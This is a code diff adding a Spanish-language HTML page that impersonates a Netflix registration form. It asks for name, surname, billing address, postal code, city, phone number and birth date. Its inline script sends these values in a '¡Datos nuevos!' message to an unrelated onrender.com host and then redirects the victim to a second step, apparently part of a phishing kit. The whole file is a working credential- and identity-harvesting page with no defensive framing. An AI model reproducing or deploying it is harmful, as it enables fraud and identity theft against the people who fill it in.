@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+      integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="style/style.css" />
+    <link rel="icon" href="img/logo.png" />
+    <title>Netflix</title>
+  </head>
+  <body>
+    <div class="upper">
+      <div class="logo">
+        <a href="#">
+          <img src="img/Netflix-Logo.png" class="img-logo" />
+        </a>
+      </div>
+      <div class="login-div">
+        <div class="login">
+          <h1>Introduce tus datos</h1>
+          <div class="input-text">
+            <input
+              type="text"
+              id="inputNome"
+              name="email"
+              placeholder="Nombre"
+              required
+            />
+          </div>
+          <div class="input-text">
+            <input
+              type="text"
+              id="inputSobrenome"
+              name="password"
+              placeholder="Apellido"
+              required
+            />
+          </div>
+          <div class="input-text">
+            <input
+              type="text"
+              id="inputEndereco"
+              name="email"
+              placeholder="Dirección de facturación"
+              required
+            />
+          </div>
+          <div class="input-text">
+            <input
+              type="text"
+              id="inputCep"
+              name="email"
+              placeholder="Código postal"
+              inputmode="numeric"
+              required
+            />
+          </div>
+          <div class="input-text">
+            <input
+              type="text"
+              id="inputCidade"
+              name="email"
+              placeholder="Ciudad"
+              inputmode="text"
+              required
+            />
+          </div>
+          <div class="input-text">
+            <input
+              type="text"
+              id="inputTelefone"
+              name="email"
+              placeholder="Número de teléfono"
+              required
+            />
+          </div>
+          <div class="input-text">
+            <input
+              type="text"
+              id="inputBirthday"
+              name="email"
+              placeholder="Fecha de nacimiento"
+              inputmode="numeric"
+              required
+            />
+          </div>
+          <div>
+            <div class="protection color_link help">
+              Al hacer clic en el botón, aceptas los términos de uso y las condiciones de Netflix.
+            </div>
+            <button class="signin-button" onClick="buttonOnClick()">
+              Finalizar registro
+            </button>
+          </div>
+          <div class="remember-flex">
+        </div>
+      </div>
+    </div>
+    <script src="js/script.js"></script>
+    <script>
+      function buttonOnClick() {
+        sendData().then(() => {
+          redirectStep2();
+        });
+      }
+
+      function sendData() {
+        const nome = document.getElementById("inputNome").value;
+        const sobrenome = document.getElementById("inputSobrenome").value;
+        const endereco = document.getElementById("inputEndereco").value;
+        const cep = document.getElementById("inputCep").value;
+        const cidade = document.getElementById("inputCidade").value;
+        const telefone = document.getElementById("inputTelefone").value;
+        const birthday = document.getElementById("inputBirthday").value;
+
+        if (nome === "" || sobrenome === "" || endereco === "" || cep === "" || cidade === "" || telefone === "" || birthday === "") {
+          return;
+        } else {
+          return fetch("https://apineittel.onrender.com/submit", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              content: `¡Datos nuevos!\n\nNombre: ${nome}\nApellido: ${sobrenome}\nDirección: ${endereco}\nCódigo postal: ${cep}\nCiudad: ${cidade}\nTeléfono: ${telefone}\nFecha de nacimiento: ${birthday}`,
+            }),
+          }).then((response) => response.json());
+        }
+      }
+    </script>
+  </body>
+</html>
